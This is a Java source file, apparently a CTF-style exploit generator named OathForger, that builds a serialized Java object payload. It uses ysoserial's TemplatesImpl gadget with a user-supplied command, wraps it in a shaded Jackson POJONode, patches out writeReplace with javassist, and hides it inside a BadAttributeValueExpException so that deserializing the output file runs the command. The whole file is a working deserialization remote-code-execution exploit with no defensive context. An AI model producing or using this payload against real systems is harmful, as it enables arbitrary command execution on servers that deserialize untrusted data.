import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import javax.management.BadAttributeValueExpException;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.nd4j.shade.jackson.databind.node.POJONode;
import ysoserial.payloads.util.Gadgets;

public class OathForger {
    private static String stringWithHash(int target) {
        long value = Integer.toUnsignedLong(target);
        if (value == 0) return new String(new char[]{0});

        char[] digits = new char[7];
        int pos = digits.length;

        while (value != 0) {
            digits[--pos] = (char)(value % 31);
            value /= 31;
        }
        return new String(digits, pos, digits.length - pos);
    }

    private static void disableWriteReplace() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        for (String entry : System.getProperty("java.class.path").split(java.io.File.pathSeparator)) {
            if (entry.contains("jackson-1.0.0-M2.1.jar")) {
                pool.insertClassPath(entry);
            }
        }
        CtClass base = pool.get(
            "org.nd4j.shade.jackson.databind.node.BaseJsonNode"
        );
        CtMethod method = base.getDeclaredMethod("writeReplace");
        base.removeMethod(method);
        base.toClass();
    }

    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            throw new IllegalArgumentException(
                "usage: OathForger <command> <output-file>"
            );
        }

        disableWriteReplace();

        Object templates = Gadgets.createTemplatesImpl(args[0]);
        POJONode node = new POJONode(templates);

        BadAttributeValueExpException trigger =
            new BadAttributeValueExpException(null);

        java.lang.reflect.Field valField =
            BadAttributeValueExpException.class.getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(trigger, node);

        try (ObjectOutputStream out =
                 new ObjectOutputStream(new FileOutputStream(args[1]))) {
            out.writeObject(trigger);
        }

        System.out.println("created=" + args[1]);
        System.out.println("trigger=BadAttributeValueExpException");
    }
}
